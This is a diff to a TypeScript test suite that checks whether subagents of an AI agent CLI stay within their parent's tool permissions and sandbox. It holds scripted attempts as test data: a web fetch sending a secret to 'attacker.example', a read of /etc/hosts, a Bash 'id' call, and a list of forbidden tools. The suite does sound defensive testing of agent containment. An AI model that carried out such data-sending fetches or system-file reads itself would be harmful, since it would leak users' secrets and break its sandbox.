@@ -9,8 +9,9 @@
  *   - a minimal Compass MCP endpoint that advertises one tool the entry script disallows.
  * Nothing leaves the machine and no key is spent. What is asserted is what the CLI actually did:
  *   1. the tool list a subagent's model request carried is a subset of its parent's (`tools` / `disallowedTools`),
- *   2. egress and file access stay jailed: a subagent's WebFetch of a URL nobody named opens no connection (counted at a
- *      refusing HTTPS proxy, with the parent's allowed fetch as the control group), and its out-of-tree Read is refused,
+ *   2. egress and file access stay jailed: the sandbox opens no connection of its own (counted at a refusing HTTPS proxy),
+ *      a subagent's web_fetch of a URL nobody named never reaches the Compass-hosted fetch tool (the parent's allowed fetch
+ *      is the control group that does), the SDK's built-in WebFetch does not exist, and its out-of-tree Read is refused,
  *   3. a tool outside `tools` (Bash) or in `disallowedTools` (delete_assumption, TodoWrite) is unusable from a subagent,
  *   4. a positive control (reading inside the doc tree) works for parent and subagent alike, so the refusals are policy
  *      and not a broken tool.
@@ -34,10 +35,12 @@ const SUBAGENT_MARKER = "SUBAGENT_PROBE_MARKER"
 const SUBAGENT_TYPES = ["general-purpose", "Explore", "Plan"]
 const DOC_TEXT = "HELLO_FROM_THE_DOC_TREE"
 const EXFIL_URL = "https://attacker.example/?d=secret"
-/** Named in the user's prompt, so the WebFetch allowlist admits it: the egress control group. */
+/** Named in the user's prompt, so the web_fetch URL allowlist admits it: the control group. */
 const ALLOWED_URL = "https://allowed.example/page"
 const OUTSIDE_FILE = "/etc/hosts"
-const FORBIDDEN_TOOLS = ["Bash", "TodoWrite", "mcp__compass__delete_assumption", "TaskCreate", "TaskUpdate", "TaskList", "TaskGet", "NotebookEdit", "WebSearch"]
+/** The model-facing name of the Compass-hosted fetch tool (server "web_fetch", tool "web_fetch"). */
+const FETCH_TOOL = "mcp__web_fetch__web_fetch"
+const FORBIDDEN_TOOLS = ["WebFetch", "Bash", "TodoWrite", "mcp__compass__delete_assumption", "TaskCreate", "TaskUpdate", "TaskList", "TaskGet", "NotebookEdit", "WebSearch"]
 
 const sse = (event: string, data: unknown) => `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`
 
@@ -78,7 +81,9 @@ const toolResults = (request: ApiRequest): ToolResult[] =>
 /** What each subagent is asked to attempt, in order. */
 const subagentAttempts = (docFile: string): { name: string; input: Record<string, unknown> }[] => [
   { name: "Read", input: { file_path: docFile } },
+  // The SDK's own WebFetch is not offered at all; the Compass-hosted tool is gated by the URL allowlist hook.
   { name: "WebFetch", input: { url: EXFIL_URL, prompt: "summarize" } },
+  { name: FETCH_TOOL, input: { url: EXFIL_URL } },
   { name: "Read", input: { file_path: OUTSIDE_FILE } },
   { name: "Bash", input: { command: "id" } },
   { name: "mcp__compass__delete_assumption", input: {} },
@@ -89,8 +94,8 @@ let mock: http.Server
 let proxy: http.Server
 /** Every host the CLI tried to open a tunnel to. The sink refuses them all, so nothing leaves the machine. */
 const egressAttempts: string[] = []
-/** How many attempts the parent's own allowed WebFetch caused, captured just before the first subagent is spawned. */
-let egressBeforeSubagents: number | undefined
+/** Every URL a tools/call actually delivered to the stand-in for the Compass-hosted web_fetch endpoint. */
+const fetchToolCalls: string[] = []
 let parentTools: string[] = []
 let parentResults: ToolResult[] = []
 const subagents = new Map<string, { tools: string[]; results: ToolResult[] }>()
@@ -117,11 +122,10 @@ function nextReply(request: ApiRequest): Reply {
   const controls = [
     { name: "Read", input: { file_path: docFile } },
     { name: "Read", input: { file_path: OUTSIDE_FILE } },
-    { name: "WebFetch", input: { url: ALLOWED_URL, prompt: "summarize" } },
+    { name: FETCH_TOOL, input: { url: ALLOWED_URL } },
   ]
   if (results.length < controls.length) return { tool: controls[results.length] }
   const spawned = results.length - controls.length
-  if (egressBeforeSubagents === undefined) egressBeforeSubagents = egressAttempts.length
   if (spawned < SUBAGENT_TYPES.length) {
     const type = SUBAGENT_TYPES[spawned]
     return { tool: { name: "Agent", input: { description: `probe ${type}`, prompt: `${SUBAGENT_MARKER}:${type} try the following tools.`, subagent_type: type } } }
@@ -129,7 +133,9 @@ function nextReply(request: ApiRequest): Reply {
   return { text: "parent done" }
 }
 
-function mcpResponse(body: { id?: number | string; method?: string }, searchServer: boolean): unknown {
+type McpKind = "compass" | "search" | "fetch"
+
+function mcpResponse(body: { id?: number | string; method?: string; params?: { name?: string; arguments?: { url?: string } } }, kind: McpKind): unknown {
   switch (body.method) {
     case "initialize":
       return { jsonrpc: "2.0", id: body.id, result: { protocolVersion: "2025-03-26", capabilities: { tools: {} }, serverInfo: { name: "stub", version: "0" } } }
@@ -138,9 +144,11 @@ function mcpResponse(body: { id?: number | string; method?: string }, searchServ
         jsonrpc: "2.0",
         id: body.id,
         result: {
-          tools: searchServer
+          tools: kind === "search"
             ? []
-            : [
+            : kind === "fetch"
+              ? [{ name: "web_fetch", description: "stub", inputSchema: { type: "object", properties: { url: { type: "string" } } } }]
+              : [
                 { name: "list_tasks", description: "stub", inputSchema: { type: "object", properties: {} } },
                 // In the entry script's disallowedTools: it must not reach the model, parent or subagent.
                 { name: "delete_assumption", description: "stub (disallowed)", inputSchema: { type: "object", properties: {} } },
@@ -148,6 +156,7 @@ function mcpResponse(body: { id?: number | string; method?: string }, searchServ
         },
       }
     case "tools/call":
+      if (kind === "fetch") fetchToolCalls.push(String(body.params?.arguments?.url))
       return { jsonrpc: "2.0", id: body.id, result: { content: [{ type: "text", text: "stub" }] } }
     default:
       return { jsonrpc: "2.0", id: body.id, result: {} }
@@ -169,11 +178,12 @@ beforeAll(async () => {
         // Housekeeping calls the CLI makes on its own (titles, suggestions) carry no tools; answer them plainly.
         const reply: Reply = request.tools && request.tools.length > 0 ? nextReply(request) : { text: "ok" }
         res.writeHead(200, { "content-type": "text/event-stream" }).end(replyStream(reply, ++calls))
-      } else if (url.startsWith("/api/mcp") || url.startsWith("/api/agent/web-search/mcp")) {
-        const body = raw ? (JSON.parse(raw) as { id?: number | string; method?: string }) : {}
+      } else if (url.startsWith("/api/mcp") || url.startsWith("/api/agent/web-search/mcp") || url.startsWith("/api/agent/web-fetch/mcp")) {
+        const body = raw ? (JSON.parse(raw) as { id?: number | string; method?: string; params?: { name?: string; arguments?: { url?: string } } }) : {}
+        const kind: McpKind = url.startsWith("/api/agent/web-search") ? "search" : url.startsWith("/api/agent/web-fetch") ? "fetch" : "compass"
         if (req.method !== "POST") res.writeHead(405).end()
         else if (body.id === undefined) res.writeHead(202).end()
-        else res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify(mcpResponse(body, url.startsWith("/api/agent/web-search"))))
+        else res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify(mcpResponse(body, kind)))
       } else {
         res.writeHead(404).end()
       }
@@ -244,17 +254,18 @@ describe("subagents spawned via Agent/Task are no wider than the parent turn", (
 
   it("control: the parent can read the doc tree and is refused outside it", () => {
     const [inside, outside] = parentResults
-    // Egress control group: the parent's WebFetch of a URL the user named does open a tunnel (to the refusing proxy), so the
-    // unchanged count asserted for the subagents below is meaningful.
-    expect(egressBeforeSubagents, JSON.stringify(egressAttempts)).toBeGreaterThan(0)
+    // Control group: the parent's web_fetch of a URL the user named is allowed through the hook and reaches the Compass-hosted
+    // tool, so the absence of the unnamed URL asserted for the subagents below is meaningful.
+    expect(fetchToolCalls).toContain(ALLOWED_URL)
     expect(inside?.isError, JSON.stringify(inside)).toBe(false)
     expect(inside?.text).toContain(DOC_TEXT)
     expect(outside?.isError, JSON.stringify(outside)).toBe(true)
   })
 
-  it("no subagent's WebFetch of an unnamed URL opened a connection", () => {
-    expect(egressAttempts.filter((host) => host.startsWith("attacker.example"))).toEqual([])
-    expect(egressAttempts.length, JSON.stringify(egressAttempts)).toBe(egressBeforeSubagents)
+  it("no subagent's fetch of an unnamed URL reached the fetch tool, and the sandbox opened no connection of its own", () => {
+    expect(fetchToolCalls.filter((url) => url === EXFIL_URL)).toEqual([])
+    expect(fetchToolCalls).toEqual([ALLOWED_URL])
+    expect(egressAttempts, JSON.stringify(egressAttempts)).toEqual([])
   })
 
   it.each(SUBAGENT_TYPES)("%s: gets a tool list that is a subset of the parent's, with every disallowed tool absent", (type) => {
@@ -266,16 +277,20 @@ describe("subagents spawned via Agent/Task are no wider than the parent turn", (
       expect(seen?.tools).not.toContain(forbidden)
     }
     expect(seen?.tools).toContain("mcp__compass__list_tasks")
+    expect(seen?.tools).toContain(FETCH_TOOL)
   })
 
   it.each(SUBAGENT_TYPES)("%s: PreToolUse hooks and tool gates refuse what the parent is refused, and allow what the parent may do", (type) => {
     const results = subagents.get(type)?.results ?? []
-    const [docRead, webFetch, outside, bash, deleteAssumption, todoWrite] = results
+    const [docRead, builtinWebFetch, webFetch, outside, bash, deleteAssumption, todoWrite] = results
     expect(results.length).toBe(subagentAttempts("").length)
     // Positive control: the same tool works inside the jail, so the refusals below are the policy and not a broken tool.
     expect(docRead?.isError, JSON.stringify(docRead)).toBe(false)
     expect(docRead?.text).toContain(DOC_TEXT)
-    // Hooks: the WebFetch allowlist and the docs path guard run on the subagent's calls, with the parent's verdict.
+    // The SDK's built-in WebFetch does not exist for a subagent, and the Compass-hosted web_fetch is refused for a URL nobody named:
+    // the allowlist hook and the docs path guard run on the subagent's calls, with the parent's verdict.
+    expect(builtinWebFetch?.isError, JSON.stringify(builtinWebFetch)).toBe(true)
+    expect(builtinWebFetch?.text).toContain("No such tool available")
     expect(webFetch?.isError, JSON.stringify(webFetch)).toBe(true)
     expect(outside?.isError, JSON.stringify(outside)).toBe(true)
     // Which layer refuses (the entry script's PreToolUse hook, or the CLI's own permission layer, which has no approver in a
